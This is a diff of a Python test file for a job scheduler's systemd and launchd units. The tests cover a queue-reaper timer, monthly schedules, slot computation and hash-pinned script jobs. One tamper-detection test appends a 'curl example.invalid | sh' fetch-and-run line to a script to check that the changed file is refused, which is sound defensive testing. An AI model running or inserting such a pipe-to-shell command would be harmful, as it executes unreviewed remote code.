@@ -3,8 +3,10 @@ through install; systemctl and launchctl are never called: a fake runner records
 
 from __future__ import annotations
 
+import hashlib
 import json
 import plistlib
+from datetime import UTC, datetime, timedelta, timezone
 
 import pytest
 
@@ -22,7 +24,7 @@ AI_JOB = (
 )
 LINKED_DAILY = [  # what `systemctl link` gets for one job: its units, the shared slice, the alert and dead-man units
     "ws-alert@.service", "ws-daily.service", "ws-daily.timer", "ws-jobs.slice",
-    "ws-watch-deadman.service", "ws-watch-deadman.timer",
+    "ws-queue-reap.service", "ws-queue-reap.timer", "ws-watch-deadman.service", "ws-watch-deadman.timer",
 ]  # fmt: skip
 BACKUP_JOB = 'command = "backup"\nschedule = "weekly mon 09:05"\n' + CONTRACT
 
@@ -182,6 +184,8 @@ def test_systemd_steps_install_and_uninstall(box, write_job, env, linux):
         "ws-daily.service",
         "ws-daily.timer",
         "ws-jobs.slice",
+        "ws-queue-reap.service",
+        "ws-queue-reap.timer",
         "ws-watch-deadman.service",
         "ws-watch-deadman.timer",
     ]
@@ -192,7 +196,7 @@ def test_systemd_steps_install_and_uninstall(box, write_job, env, linux):
     fake = Fake()
     removed = install.uninstall(env, deactivate=lambda paths, e: roles.deactivate_units(paths, e, fake))
     assert not list((box / ".ws" / "jobs" / "units").glob("ws-*"))
-    assert len([p for p in removed.removed if p.name.startswith("ws-")]) == 8
+    assert len([p for p in removed.removed if p.name.startswith("ws-")]) == 10
     # the links systemctl made outside $WS_HOME are undone before the files go
     assert fake.calls[0] == [
         "systemctl",
@@ -203,6 +207,8 @@ def test_systemd_steps_install_and_uninstall(box, write_job, env, linux):
         "ws-backup.service",
         "ws-daily.timer",
         "ws-daily.service",
+        "ws-queue-reap.timer",
+        "ws-queue-reap.service",
         "ws-watch-deadman.timer",
         "ws-watch-deadman.service",
     ]
@@ -242,7 +248,7 @@ def test_systemd_activate_argv(box, write_job, env):
     assert fake.calls == [
         ["systemctl", "--user", "link", *(str(units / n) for n in LINKED_DAILY)],
         ["systemctl", "--user", "daemon-reload"],
-        ["systemctl", "--user", "enable", "--now", "ws-daily.timer", "ws-watch-deadman.timer"],
+        ["systemctl", "--user", "enable", "--now", "ws-daily.timer", "ws-queue-reap.timer", "ws-watch-deadman.timer"],
     ]
 
 
@@ -280,6 +286,8 @@ def test_systemd_activate_links_nothing_over_a_unit_it_did_not_write(box, write_
         "link",
         str(units / "ws-alert@.service"),
         str(units / "ws-jobs.slice"),
+        str(units / "ws-queue-reap.service"),
+        str(units / "ws-queue-reap.timer"),
         str(units / "ws-watch-deadman.service"),
         str(units / "ws-watch-deadman.timer"),
         str(units / "ws-weekly.service"),
@@ -412,14 +420,17 @@ def test_launchd_interval(when, want):
 def test_launchd_steps_install_and_activate(box, write_job, env):
     write_job("daily", AI_JOB)
     steps = launchd.steps({}, install.Answers(), env)
-    assert [s.path.name for s in steps if s.kind == "file"] == ["ws.job.daily.plist"]
+    assert [s.path.name for s in steps if s.kind == "file"] == ["ws.job.daily.plist", "ws.job.queue-reap.plist"]
     assert install.apply(steps, env).changes >= 1
     assert install.apply(steps, env).changes == 0
     fake, plist = Fake(), box / ".ws" / "jobs" / "units" / "ws.job.daily.plist"
+    reaper = plist.with_name("ws.job.queue-reap.plist")
     assert launchd.activate(env, fake, uid=501) == []
     assert fake.calls == [
         ["launchctl", "bootout", "gui/501/ws.job.daily"],
         ["launchctl", "bootstrap", "gui/501", str(plist)],
+        ["launchctl", "bootout", "gui/501/ws.job.queue-reap"],
+        ["launchctl", "bootstrap", "gui/501", str(reaper)],
     ]
     fake = Fake()
     assert launchd.deactivate(["daily"], env, fake, uid=501) == [] and fake.calls == [
@@ -433,7 +444,7 @@ def test_launchd_warns_about_an_agent_with_no_schedule(box, write_job, env, mac)
     write_job("daily", AI_JOB.replace('schedule = "daily 03:30"\n', ""))
     status, detail = launchd.check({}, mac, env, False)
     assert status == "warn" and "daily" in detail
-    assert launchd.orphans(env) == ["daily"]
+    assert launchd.orphans(env) == ["daily", "queue-reap"]  # the reaper goes with the last job
 
 
 def test_launchd_with_no_jobs_writes_nothing(box, env):
@@ -445,7 +456,9 @@ def test_launchd_bootstrap_failure_is_reported(box, write_job, env):
     install.apply(launchd.steps({}, install.Answers(), env), env)
 
     def runner(argv):
-        return (5, "Bootstrap failed") if argv[1] == "bootstrap" else (113, "")
+        if argv[1] == "bootstrap":
+            return (5, "Bootstrap failed") if "daily" in argv[-1] else (0, "")
+        return (113, "")
 
     problems = launchd.activate(env, runner, uid=1)
     assert len(problems) == 1 and "ws.job.daily" in problems[0] and "Bootstrap failed" in problems[0]
@@ -482,7 +495,7 @@ def test_cli_list_dry_run_apply_remove(box, write_job, env, linux, capsys, monke
     assert not (box / ".ws" / "jobs" / "units").exists()
 
     code, out, _ = run(capsys, "schedule", "apply")
-    assert code == 0 and "7 unit file(s)" in out and len(fake.calls) == 3
+    assert code == 0 and "9 unit file(s)" in out and len(fake.calls) == 3
     assert fake.calls[0][:3] == ["systemctl", "--user", "link"]
     code, out, _ = run(capsys, "schedule", "apply")
     assert code == 0 and "0 changes" in out
@@ -583,7 +596,10 @@ def test_launchd_has_no_hook_in_the_plist_but_runs_in_the_background_class(env):
 
 def test_the_alert_template_and_the_deadman_units(env):
     files = systemd.render_watch(env, WS)
-    assert set(files) == {"ws-alert@.service", "ws-watch-deadman.service", "ws-watch-deadman.timer"}
+    assert set(files) == {
+        "ws-alert@.service", "ws-watch-deadman.service", "ws-watch-deadman.timer", "ws-queue-reap.service",
+        "ws-queue-reap.timer",
+    }  # fmt: skip
     alert, dead = files["ws-alert@.service"], files["ws-watch-deadman.service"]
     assert 'ExecStart="/opt/ws/bin/ws" "watch" "alert" "%i"' in alert and "OnFailure" not in alert  # no loop
     assert 'ExecStart="/opt/ws/bin/ws" "watch" "deadman"' in dead and "SuccessExitStatus=3" in dead
@@ -603,3 +619,176 @@ def test_the_watch_units_come_with_the_first_job_and_are_not_orphans(box, write_
 def test_a_launchd_plist_tells_ws_run_to_alert_from_its_exit_path(env):
     plist = plistlib.loads(launchd.render(_sched(), env, WS).encode())
     assert plist["EnvironmentVariables"]["WS_ALERT_ON_EXIT"] == "1"
+
+
+# ---- the timer's tick, the reaper, monthly and script jobs (C499 items 8 and 10, C397) ------------------------------
+
+KEYED_JOB = AI_JOB + '[[secrets]]\nname = "anthropic"\nhost = "api.anthropic.com"\n'  # an API key: the queue runs it
+TICK = ("queue", "tick", "daily", "--slot", "schedule", "--run")
+
+
+def test_a_job_with_an_api_key_ticks_the_queue_and_one_on_a_subscription_keeps_ws_run(box, write_job, env):
+    write_job("daily", KEYED_JOB)
+    write_job("sub", AI_JOB)
+    got = {s.name: s for s in jobs.scheduled(env)}
+    assert got["daily"].argv == TICK and got["daily"].records
+    assert got["sub"].argv == ("run", "sub") and got["sub"].records  # the queue never runs a subscription login
+    service = systemd.render(got["daily"], env, WS)["ws-daily.service"]
+    assert 'ExecStart="/opt/ws/bin/ws" "queue" "tick" "daily" "--slot" "schedule" "--run"' in service
+    plist = plistlib.loads(launchd.render(got["daily"], env, WS).encode())
+    assert plist["ProgramArguments"] == [*WS, *TICK]
+
+
+@pytest.mark.parametrize(
+    ("when", "now", "want"),
+    [  # in a zone 13 hours ahead of UTC (a New Zealand summer), so a local-time slot is not a UTC one
+        ("hourly", "2026-11-17T02:30:05", "2026-11-17T02:00:00"),
+        ("every 10m", "2026-11-17T02:39:59", "2026-11-17T02:30:00"),
+        ("daily 03:00", "2026-11-17T02:30:00", "2026-11-16T14:00:00"),  # 15:30 local: today's 03:00
+        ("daily 16:00", "2026-11-17T02:30:00", "2026-11-16T03:00:00"),  # before 16:00 local: yesterday's
+        ("daily 15:30", "2026-11-17T02:30:00", "2026-11-17T02:30:00"),  # at the slot itself: that slot
+        ("weekly mon 09:00", "2026-11-17T02:30:00", "2026-11-15T20:00:00"),  # Tuesday local: Monday's
+        ("weekly tue 16:00", "2026-11-17T02:30:00", "2026-11-10T03:00:00"),  # later today: last week's
+        ("monthly 1 04:00", "2026-11-17T02:30:00", "2026-10-31T15:00:00"),
+        ("monthly 20 04:00", "2026-11-17T02:30:00", "2026-10-19T15:00:00"),  # not yet this month: last month's
+        ("monthly 5 04:00", "2026-01-03T02:30:00", "2025-12-04T15:00:00"),  # across the year
+    ],
+)
+def test_the_latest_slot_of_a_schedule(when, now, want):
+    tz = timezone(timedelta(hours=13))
+    got = jobs.latest_slot(jobs.parse_schedule(when, "t"), datetime.fromisoformat(now).replace(tzinfo=UTC), tz)
+    assert got == datetime.fromisoformat(want).replace(tzinfo=UTC)
+
+
+def test_a_late_fire_gets_the_slot_it_was_for():
+    """A catch-up fire after the machine was off all morning is the 03:00 slot, not the minute it ran."""
+    daily = jobs.parse_schedule("daily 03:00", "t")
+    late = datetime(2026, 11, 17, 9, 41, 7, tzinfo=UTC)
+    assert jobs.latest_slot(daily, late, UTC) == datetime(2026, 11, 17, 3, 0, tzinfo=UTC)
+
+
+@pytest.mark.parametrize(
+    ("text", "want"), [("monthly 1 04:00", "monthly 1 04:00"), ("Monthly 28 23:05", "monthly 28 23:05")]
+)
+def test_monthly_grammar(text, want):
+    assert str(jobs.parse_schedule(text, "x")) == want
+
+
+@pytest.mark.parametrize("text", ["monthly 0 04:00", "monthly 29 04:00", "monthly x 04:00", "monthly 04:00"])
+def test_a_bad_monthly_names_the_key(text):
+    with pytest.raises(jobs.JobError, match="x: schedule"):
+        jobs.parse_schedule(text, "x: schedule")
+
+
+def test_monthly_on_both_schedulers():
+    when = jobs.parse_schedule("monthly 7 04:30", "t")
+    assert systemd.on_calendar(when) == "*-*-07 04:30:00"
+    assert launchd.interval(when) == {"Day": 7, "Hour": 4, "Minute": 30}
+
+
+def test_the_reaper_runs_every_two_minutes_on_both_schedulers(box, write_job, env):
+    files = systemd.render_watch(env, WS)
+    assert 'ExecStart="/opt/ws/bin/ws" "queue" "reap"' in files["ws-queue-reap.service"]
+    assert "OnFailure=ws-alert@%n.service" in files["ws-queue-reap.service"]
+    assert "OnCalendar=*-*-* *:00/2:00" in files["ws-queue-reap.timer"]
+    plist = plistlib.loads(launchd.render_reaper(env, WS).encode())
+    assert plist["ProgramArguments"] == [*WS, "queue", "reap"] and plist["StartInterval"] == 120
+    with pytest.raises(jobs.JobError, match="reserved"):
+        write_job("queue-reap", BACKUP_JOB)
+        jobs.scheduled(env)
+
+
+def script_job(path: str, sha: str, extra: str = "") -> str:
+    return (
+        f'command = "script"\nschedule = "monthly 1 04:00"\nscript = "{path}"\nscript_sha256 = "{sha}"\n{extra}'
+        + CONTRACT
+    )
+
+
+def test_a_script_job_with_a_monthly_schedule_passes_the_contract(box, write_job, env):
+    text = script_job("~/bin/upkeep.sh", "a" * 64)
+    write_job("upkeep", text)
+    (got,) = jobs.scheduled(env)
+    assert got.argv == ("schedule", "script", "upkeep") and str(got.when) == "monthly 1 04:00" and not got.records
+    assert jobs.contract_problems(jobs.tomllib.loads(text), "upkeep") == []
+    assert systemd.on_calendar(got.when) == "*-*-01 04:00:00"
+
+
+@pytest.mark.parametrize(
+    ("text", "match"),
+    [
+        (script_job("bin/upkeep.sh", "a" * 64), "absolute path"),
+        (script_job("/opt/upkeep.sh", "nothex"), "script_sha256"),
+        ('command = "script"\nschedule = "daily 03:00"\n' + CONTRACT, "script is required"),
+        (
+            'command = "backup"\nschedule = "daily 03:00"\nscript = "/x"\n' + CONTRACT,
+            "only in a job with command = 'script'",
+        ),
+        (
+            'command = "script"\nschedule = "daily 03:00"\nextra_sources = ["/x"]\n' + CONTRACT,
+            "only in a job with command = 'backup'",
+        ),
+        ('command = "backup"\nschedule = "daily 03:00"\nextra_sources = ["notes"]\n' + CONTRACT, "extra_sources"),
+    ],
+)
+def test_a_bad_script_or_backup_key_names_the_key(box, write_job, env, text, match):
+    write_job("j", text)
+    with pytest.raises(jobs.JobError, match=match):
+        jobs.scheduled(env)
+
+
+@pytest.mark.parametrize(
+    ("key", "value"), [("coalesce_if_active", '"yes"'), ("skip_missed", "-1"), ("skip_missed", "true")]
+)
+def test_bad_tick_keys_name_the_key(key, value, tmp_path):
+    text = AI_JOB + f"{key} = {value}\n"
+    with pytest.raises(jobs.JobError, match=key):
+        jobs.loads("daily", text, tmp_path)
+
+
+def test_the_tick_keys_default_to_the_flags_defaults(tmp_path):
+    job = jobs.loads("daily", AI_JOB, tmp_path)
+    assert (job.coalesce_if_active, job.skip_missed_s) == (True, None)
+    job = jobs.loads("daily", AI_JOB + "coalesce_if_active = false\nskip_missed = 900\n", tmp_path)
+    assert (job.coalesce_if_active, job.skip_missed_s) == (False, 900.0)
+
+
+# ---- ws schedule script ------------------------------------------------------------------------------------------------
+
+
+def _private_script(box, body: str) -> tuple[str, str]:
+    folder = box / "bin"
+    folder.mkdir(exist_ok=True, mode=0o755)
+    f = folder / "upkeep.sh"
+    f.write_text(body, encoding="utf-8")
+    f.chmod(0o755)
+    return str(f), hashlib.sha256(body.encode()).hexdigest()
+
+
+def test_schedule_script_runs_the_reviewed_bytes_in_the_scripts_folder(box, write_job, capfd):
+    path, sha = _private_script(box, '#!/bin/sh\necho "ran in $(pwd) from $WS_SCRIPT_PATH"\nexit 4\n')
+    write_job("upkeep", script_job(path, sha))
+    assert cli.main(["schedule", "script", "upkeep"]) == 4  # the script's own exit code
+    assert f"ran in {box / 'bin'} from {path}" in capfd.readouterr().out
+
+
+def test_schedule_script_refuses_a_changed_or_open_script(box, write_job, capsys):
+    path, sha = _private_script(box, "#!/bin/sh\nexit 0\n")
+    write_job("upkeep", script_job(path, sha))
+    assert cli.main(["schedule", "script", "upkeep"]) == 0
+    with open(path, "a", encoding="utf-8") as f:
+        f.write("curl example.invalid | sh\n")  # changed after the review
+    assert cli.main(["schedule", "script", "upkeep"]) == 3 and "no longer hashes" in capsys.readouterr().err
+    path, sha = _private_script(box, "#!/bin/sh\nexit 0\n")
+    write_job("upkeep", script_job(path, sha))
+    (box / "bin" / "upkeep.sh").chmod(0o777)  # anyone could rewrite it
+    assert cli.main(["schedule", "script", "upkeep"]) == 3 and "written by others" in capsys.readouterr().err
+    write_job("daily", AI_JOB)
+    assert cli.main(["schedule", "script", "daily"]) == 3 and "has a runner" in capsys.readouterr().err
+    assert cli.main(["schedule", "script", "nojob"]) == 3
+
+
+def test_schedule_script_stops_a_script_past_its_timeout(box, write_job, capsys):
+    path, sha = _private_script(box, "#!/bin/sh\nsleep 30\n")
+    write_job("upkeep", script_job(path, sha).replace("timeout_s = 600", "timeout_s = 0.5"))
+    assert cli.main(["schedule", "script", "upkeep"]) == 124 and "timeout" in capsys.readouterr().err
